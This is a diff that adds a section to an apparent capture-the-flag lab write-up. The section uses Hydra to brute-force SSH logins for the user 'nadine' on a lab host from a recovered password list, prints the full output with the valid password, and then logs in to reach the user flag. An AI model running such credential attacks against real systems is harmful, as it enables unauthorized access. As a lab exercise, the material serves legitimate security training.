@@ -253,6 +253,50 @@ Gr4etN3w5w17hMySk1Pa5$
 
 Attempting to login via the NVMS-1000 login page as the user `Nathan` with the passwords above does not work. In the txt file titled `Notes to do.txt`, we can see that Nathan has changed the password for NVMS and locked down access.
 
+## SSH Login - User Flag
+
+The passwords list was tested against both users and a successful login was found for the user `nadine`:
+
+```bash
+> hydra 10.10.10.184 ssh -l nadine -P passwords.txt -f -V
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-12 13:43:11
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
+[DATA] attacking ssh://10.10.10.184:22/
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "1nsp3ctTh3Way2Mars!" - 1 of 7 [child 0] (0/0)
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "Th3r34r3To0M4nyTrait0r5!" - 2 of 7 [child 1] (0/0)
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "B3WithM30r4ga1n5tMe" - 3 of 7 [child 2] (0/0)
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "L1k3B1gBut7s@W0rk" - 4 of 7 [child 3] (0/0)
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "0nly7h3y0unGWi11F0l10w" - 5 of 7 [child 4] (0/0)
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "IfH3s4b0Utg0t0H1sH0me" - 6 of 7 [child 5] (0/0)
+[ATTEMPT] target 10.10.10.184 - login "nadine" - pass "Gr4etN3w5w17hMySk1Pa5$" - 7 of 7 [child 6] (0/0)
+[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
+1 of 1 target successfully completed, 1 valid password found
+```
+
+I can login via SSH and recover the first flag.
+
+```bash
+ssh nadine@10.10.10.184
+
+Directory of C:\Users\Nadine\Desktop              
+                                                   
+02/28/2022  08:05 PM    <DIR>          .           
+02/28/2022  08:05 PM    <DIR>          ..          
+05/12/2024  04:32 AM                34 user.txt    
+               1 File(s)             34 bytes      
+               2 Dir(s)   6,130,212,864 bytes free
+```
+
+
+
+
+
+
+
 
 
 
